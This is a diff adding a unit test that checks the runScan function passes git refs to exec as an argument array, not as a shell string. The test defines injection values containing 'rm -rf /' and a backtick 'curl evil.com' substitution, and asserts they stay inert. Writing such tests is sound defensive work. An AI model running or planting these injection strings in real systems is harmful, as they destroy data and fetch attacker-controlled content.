@@ -67,4 +67,65 @@ describe("runScan", () => {
       }),
     ).rejects.toThrow(/fetch-depth: 0/);
   });
+
+  it("passes adversarial refs as argument-array values (no shell interpolation)", async () => {
+    const adversarialBase = 'main;rm -rf /;echo "pwned"';
+    const adversarialHead = 'HEAD`$(curl evil.com)`';
+    const stdout = JSON.stringify({
+      schemaVersion: 1,
+      generatedAt: "2026-01-01T00:00:00Z",
+      baseRef: adversarialBase,
+      headRef: adversarialHead,
+      headHash: "abc",
+      branchName: "feature/x",
+      treeClean: true,
+      changeCount: 0,
+      changes: [],
+      riskLevel: "low",
+      riskReasons: [],
+      analysisWarnings: [],
+    });
+
+    const capturedCmd: string[] = [];
+    const capturedArgs: string[] = [];
+    mockedExec.mockImplementation(async (cmd, args, options) => {
+      capturedCmd.push(cmd);
+      if (Array.isArray(args)) capturedArgs.push(...args);
+      options?.listeners?.stdout?.(Buffer.from(stdout));
+      return 0;
+    });
+
+    const outputPath = path.join(os.tmpdir(), `ledgerful-run-adv-${Date.now()}.json`);
+    await runScan({
+      binaryPath: "/tmp/ledgerful",
+      baseRef: adversarialBase,
+      headRef: adversarialHead,
+      outputPath,
+      cwd: "/tmp",
+    });
+
+    // exec must be called with the binary path as cmd and an args array — never a shell string
+    expect(capturedCmd[0]).toBe("/tmp/ledgerful");
+    expect(Array.isArray(capturedArgs)).toBe(true);
+    // The adversarial refs must appear verbatim as a single arg inside the range string,
+    // not split into separate shell tokens. The range is one arg: "<base>...<head>"
+    const rangeArg = capturedArgs.find((a) => a.includes("..."));
+    expect(rangeArg).toBeDefined();
+    expect(rangeArg).toBe(`${adversarialBase}...${adversarialHead}`);
+    // No shell metacharacter should cause arg splitting — the whole range is ONE arg.
+    // Assert the shell-dangerous tokens do NOT appear as standalone args (they're safely
+    // embedded inside the single range string, never interpreted by a shell).
+    expect(capturedArgs).not.toContain("rm");
+    expect(capturedArgs).not.toContain("-rf");
+    expect(capturedArgs).not.toContain("curl");
+    expect(capturedArgs).not.toContain("evil.com");
+    // The only args should be: scan, --pr, <range>, --format, json
+    expect(capturedArgs).toHaveLength(5);
+    expect(capturedArgs[0]).toBe("scan");
+    expect(capturedArgs[1]).toBe("--pr");
+    expect(capturedArgs[3]).toBe("--format");
+    expect(capturedArgs[4]).toBe("json");
+
+    fs.unlinkSync(outputPath);
+  });
 });
